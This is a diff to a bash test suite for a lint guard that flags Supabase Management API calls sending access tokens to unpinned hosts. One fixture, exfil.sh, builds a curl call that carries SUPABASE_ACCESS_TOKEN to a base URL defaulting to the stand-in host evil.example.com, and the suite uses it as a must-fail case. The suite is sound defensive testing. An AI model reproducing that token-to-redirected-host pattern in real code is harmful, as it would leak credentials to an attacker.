@@ -90,6 +90,9 @@ write_hw() { printf '%s  # fixture baseline\n' "$2" > "$1" || setup_die "write_h
 # matters is the fixture's, not this source file's.
 _HOST='https://api.supabase.com'
 _SEG='/v1/projects/'
+# The same segment WITHOUT the trailing slash — the shape a base built in one statement and
+# consumed in the next actually has at rest. Rows 8/8b turn on the difference.
+_SEGB='/v1/projects'
 _ADV='advisors/security'
 _LOGS='analytics/endpoints/logs.all'
 _EVIL='${SUPABASE_API_HOST:-https://evil.example.com}'
@@ -350,6 +353,38 @@ if [[ "$RC" -eq 0 ]]; then pass; else
 fi
 if [[ "$C6" == "3" ]]; then pass; else fail "row 6: expected 3 enumerated call sites (2 shell + 1 template literal), got '$C6' — if the .ts line is missing the guard is blind to the one TypeScript caller class"; fi
 
+# ── ROW 6b — a TypeScript caller that resolves its host through `const` → PASS ────────
+# THE SECOND FALSE-POSITIVE CONTROL, and the one that was live-broken. The RHS resolver
+# recognised only the shell's space-free `V=`, so `const API = "https://api.supabase.com"` was
+# an assignment it could not see: a correctly-pinned .ts caller reported UNRESOLVABLE-HOST.
+# Fail-closed is the right direction to be wrong in, and it is still wrong — this is the shape
+# the next TypeScript caller has, and a guard that reds on the compliant shape gets switched
+# off. Distinct from row 6's service.ts, which writes the host INLINE and so never exercises
+# the resolver at all.
+T6B="$(new_tree ts-const)"
+mkdir -p "$T6B/lib" || setup_die "mkdir T6B failed"
+fixture > "$T6B/lib/client.ts" <<'FIX' || setup_die "write client.ts failed"
+const API = "@HOST@";
+
+export async function runQuery(ref: string) {
+  return fetch(`${API}@SEG@${ref}/database/query`, {
+    headers: { Authorization: `Bearer ${process.env.SUPABASE_ACCESS_TOKEN}` },
+  });
+}
+FIX
+[[ -s "$T6B/lib/client.ts" ]] || setup_die "write client.ts failed"
+seal "$T6B"
+run_guard "$GUARD" "$T6B" "$HW" --census
+C6B="$(cat "$OUT")"
+write_hw "$WORK/t6b.hw" "$C6B"
+run_guard "$GUARD" "$T6B" "$WORK/t6b.hw"
+if [[ "$RC" -eq 0 ]]; then pass; else
+  fail "row 6b: a .ts caller pinned via \`const API = <literal>\` must PASS. rc=$RC, output: $(cat "$OUT")"
+fi
+if out_has 'client\.ts:0: UNRESOLVABLE-HOST'; then
+  fail "row 6b: the resolver did not recognise \`const NAME = …\` as an assignment, so a correctly-pinned TypeScript caller is reported unprovable. Output: $(cat "$OUT")"
+else pass; fi
+
 # ── ROW 7 — a fixture tree with zero deprecated paths → PASS ──────────────────────────
 # The must-PASS non-canonical input. A guard that rejects everything is not a guard.
 T7="$(new_tree clean)"
@@ -369,6 +404,146 @@ if [[ "$RC" -eq 0 ]]; then pass; else fail "row 7: a clean tree must PASS, got r
 if out_has 'waived deprecated call sites'; then
   fail "row 7: a clean tree must report no waived sites. Output: $(cat "$OUT")"
 else pass; fi
+
+# ── ROW 8 — THE SPLIT-BASE CONSTRUCT: one file that defeated BOTH arms at once ─────────
+# The regression this suite exists for after the fact. A single file that is, simultaneously:
+# a PAT-bearing call, to an env-redirected host, at the ONE deprecated path carrying no
+# waiver. Every arm should have fired. The guard printed `0 violations` for two INDEPENDENT
+# reasons, and this row fails if either one comes back:
+#
+#   (a) arm 2's membership test read the RAW file, so the `# host pin: …` COMMENT satisfied
+#       the host pin. The comment is deliberately present here and is the whole trick: strip
+#       it and the file reds even on the pre-fix guard, which would make this row prove
+#       nothing. (Live instance: inngest.tf, whose only host literal is a `#` comment.)
+#   (b) the call-construct anchor demanded `/v1/projects/` WITH the trailing slash. `BASE`
+#       ends that segment on a quote, so the census scored zero for the file.
+T9="$(new_tree split-base)"
+mkdir -p "$T9/scripts" || setup_die "mkdir T9 failed"
+{
+  printf '#!/usr/bin/env bash\n'
+  printf '# host pin: %s is the only permitted host\n' "$_HOST"
+  printf 'BASE="%s%s"\n' "$_EVIL" "$_SEGB"
+  printf 'curl -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN" "$BASE/$REF/%s"\n' "$_LOGS"
+} > "$T9/scripts/exfil.sh" || setup_die "write exfil.sh failed"
+[[ -s "$T9/scripts/exfil.sh" ]] || setup_die "write exfil.sh failed"
+# The comment must really be the file's ONLY host literal, or sub-cause (a) is not under test.
+if [[ "$(grep -cF -- "$_HOST" "$T9/scripts/exfil.sh" || true)" -eq 1 ]] \
+   && [[ "$(grep -vE '^[[:space:]]*#' "$T9/scripts/exfil.sh" | grep -cF -- "$_HOST" || true)" -eq 0 ]]; then
+  pass
+else
+  setup_die "row 8 fixture is malformed: the host literal must appear exactly once, on a COMMENT line"
+fi
+seal "$T9"
+run_guard "$GUARD" "$T9" "$HW" --census
+C9="$(cat "$OUT")"
+write_hw "$WORK/t9.hw" "$C9"
+run_guard "$GUARD" "$T9" "$WORK/t9.hw"
+if [[ "$RC" -eq 1 ]]; then pass; else
+  fail "row 8: a PAT-bearing call to an env-redirected host at a no-waiver deprecated path must be RED, got rc=$RC. Output: $(cat "$OUT")"
+fi
+# (a). A comment is not a pin. ASSERTED AS `UNPINNED-HOST` SPECIFICALLY, not as "some host
+# finding": the inline-URL span scan also reds this file, and it does so via the (b) fix, so
+# the looser assertion stayed GREEN with (a) mutated back out and proved nothing. (Measured.)
+# UNPINNED-HOST is the one finding that turns purely on membership being read from code lines.
+if out_has 'exfil\.sh:0: UNPINNED-HOST'; then pass; else
+  fail "row 8(a): the host pin was satisfied by COMMENT TEXT — arm 2 is reading the raw file, not code lines, so any file can buy the pin with one comment. Output: $(cat "$OUT")"
+fi
+# (b). The census must SEE the split base; a guard that counts zero here is blind to the caller.
+if [[ "$C9" -ge 1 ]]; then pass; else
+  fail "row 8(b): the census scored $C9 on a file that plainly calls the Management API — the call-construct anchor is still demanding a trailing slash after /v1/projects"
+fi
+
+# ── ROW 8b — the same split base, CORRECTLY PINNED → must be COUNTED and must PASS ─────
+# Sub-cause (b) isolated from arm 2 entirely. Coverage is the property under test: the anchor
+# fix must make this caller VISIBLE (census >= 1) without making it a violation. Asserting
+# only row 8 would let someone "fix" (b) by reddening every split base.
+T10="$(new_tree split-base-pinned)"
+mkdir -p "$T10/scripts" || setup_die "mkdir T10 failed"
+{
+  printf '#!/usr/bin/env bash\n'
+  printf 'API="%s"\n' "$_HOST"
+  printf 'BASE="${API}%s"\n' "$_SEGB"
+  printf 'curl --url "$BASE/$REF/database/query" -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN"\n'
+} > "$T10/scripts/split.sh" || setup_die "write split.sh failed"
+[[ -s "$T10/scripts/split.sh" ]] || setup_die "write split.sh failed"
+seal "$T10"
+run_guard "$GUARD" "$T10" "$HW" --census
+C10="$(cat "$OUT")"
+if [[ "$C10" -ge 1 ]]; then pass; else
+  # The message names the shape by INTERPOLATING _SEGB rather than spelling it. Written out,
+  # this line would be a real call construct at rest in a tracked file and the guard would red
+  # on its own suite — the hazard the placeholder block above exists for, reappearing in a
+  # failure string. (Measured: it did.)
+  fail "row 8b: a pinned base built as \${API}${_SEGB} is INVISIBLE to the census (got '$C10'). The caller exists; the extractor has gone blind, which is the failure mode the ratchet cannot see either"
+fi
+write_hw "$WORK/t10.hw" "$C10"
+run_guard "$GUARD" "$T10" "$WORK/t10.hw"
+if [[ "$RC" -eq 0 ]]; then pass; else
+  fail "row 8b: a CORRECTLY PINNED split base must PASS — widening the anchor must buy visibility, not false positives. rc=$RC, output: $(cat "$OUT")"
+fi
+
+# ── ROW 9 — an allowlisted non-caller grows a PINNED call → ALLOWLIST-STALE ────────────
+# The allowlist buys "this file is not a caller", never "this file is exempt", and the guard's
+# header promises that a real call stops it covering the file. That promise was FALSE in its
+# likeliest case: the staleness check sat inside `if has_literal -eq 0`, so a file that added a
+# properly-pinned PAT-bearing curl scored has_literal > 0, skipped the branch, and reported
+# clean. Only the unpinned case — where UNPINNED-HOST would have fired anyway — ever reached it.
+#
+# COUPLING, DELIBERATE AND NAMED: this fixture path must be a member of the guard's ALLOWLIST
+# array. It is asserted below rather than assumed, so removing the entry fails LOUDLY here
+# instead of quietly turning this row vacuous.
+STALE_REL='apps/web-platform/scripts/run-migrations.sh'
+if [[ "$(grep -cF -- "'${STALE_REL}|" "$GUARD" || true)" -gt 0 ]]; then pass; else
+  setup_die "row 9 needs $STALE_REL on the guard's ALLOWLIST; it is not there, so this row would test nothing"
+fi
+T11="$(new_tree allowlist-stale)"
+mkdir -p "$T11/$(dirname "$STALE_REL")" || setup_die "mkdir T11 failed"
+{
+  printf '#!/usr/bin/env bash\n'
+  printf 'API="%s"\n' "$_HOST"
+  printf 'curl --url "$API%s${REF}/database/query" -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN"\n' "$_SEG"
+} > "$T11/$STALE_REL" || setup_die "write $STALE_REL failed"
+[[ -s "$T11/$STALE_REL" ]] || setup_die "write $STALE_REL failed"
+seal "$T11"
+run_guard "$GUARD" "$T11" "$HW" --census
+write_hw "$WORK/t11.hw" "$(cat "$OUT")"
+run_guard "$GUARD" "$T11" "$WORK/t11.hw"
+if [[ "$RC" -eq 1 ]]; then pass; else
+  fail "row 9: an allowlisted non-caller that grew a real call must be RED, got rc=$RC. Output: $(cat "$OUT")"
+fi
+if out_has 'run-migrations\.sh:0: ALLOWLIST-STALE'; then pass; else
+  fail "row 9: expected ALLOWLIST-STALE. The call is correctly PINNED, so nothing else fires — nested under has_literal, this finding is unreachable and the allowlist silently becomes a permanent exemption. Output: $(cat "$OUT")"
+fi
+
+# ── ROW 10 — NO `| grep -q` MID-PIPE, anywhere in either file ─────────────────────────
+# A SHAPE ASSERTION, deliberately, because this defect is INVISIBLE TO BEHAVIOURAL TESTING AT
+# THE CURRENT SCALE. `printf '%s\n' "$list" | grep -qxF -- "$x" && flag=1` is correct until the
+# producer's output exceeds the pipe buffer: grep exits on the first match, printf takes
+# SIGPIPE, and under `pipefail` the PIPELINE reports failure even though grep MATCHED — so the
+# `&&` never fires and the guard silently skips the work for exactly the input it matched.
+#
+# Measured on this machine, first entry matching, 300-byte paths:
+#      30 paths /  9 KB  -> flag=1  (correct — this is today's live assembly, hence latent)
+#     300 paths / 92 KB  -> flag=0  (WRONG; the herestring form is 1 at every size)
+#
+# A fixture big enough to cross that threshold needs ~400 tracked files and cost 16s of guard
+# runtime in trial — a real price for a bug whose whole character is that it waits. The shape
+# is what regresses, so the shape is what is asserted, and it reddens in milliseconds.
+# Comment lines are excluded: both files DESCRIBE the forbidden form in prose, which is the
+# bare-token-over-prose distinction the guard itself is built on.
+qpipe_hits=0
+for f in "$GUARD" "${BASH_SOURCE[0]}"; do
+  n="$(grep -vE '^[[:space:]]*#' "$f" | grep -cE '\|[[:space:]]*grep[[:space:]]+-[A-Za-z]*q' || true)"
+  [[ "$n" =~ ^[0-9]+$ ]] || n=0
+  if [[ "$n" -gt 0 ]]; then
+    qpipe_hits=$((qpipe_hits + n))
+    echo "  $f: $n mid-pipe \`grep -q\` line(s):" >&2
+    grep -nvE '^[[:space:]]*#' "$f" | grep -E '\|[[:space:]]*grep[[:space:]]+-[A-Za-z]*q' >&2 || true
+  fi
+done
+if [[ "$qpipe_hits" -eq 0 ]]; then pass; else
+  fail "row 10: $qpipe_hits mid-pipe \`grep -q\` construct(s). Under pipefail a match SIGPIPEs the producer and the pipeline reports failure, so the guarded assignment silently does not happen. Use a herestring — it has no producer process to signal."
+fi
 
 # ── Hard errors: the two ways this guard must refuse to certify anything ───────────────
 # 1. Scope loss. An empty assembly and a clean repo must not produce the same answer.
@@ -409,7 +584,7 @@ echo "lint-supabase-deprecated-endpoints: $passes passed, $fails failed"
 # runner reads only the exit code. Set to the FULL count of a green run, not a slack value: a
 # floor left trailing its population lets the newest assertion be deleted unnoticed. It stays
 # `-lt` (a floor, never `-eq`) so ADDING assertions is free; only deletion reds.
-MIN_ASSERTIONS=33
+MIN_ASSERTIONS=45
 if [[ $((passes + fails)) -lt "$MIN_ASSERTIONS" ]]; then
   echo "FAIL: only $((passes + fails)) assertions ran, expected >= ${MIN_ASSERTIONS}. An empty or unreadable fixture source must not exit 0 with zero coverage." >&2
   exit 1
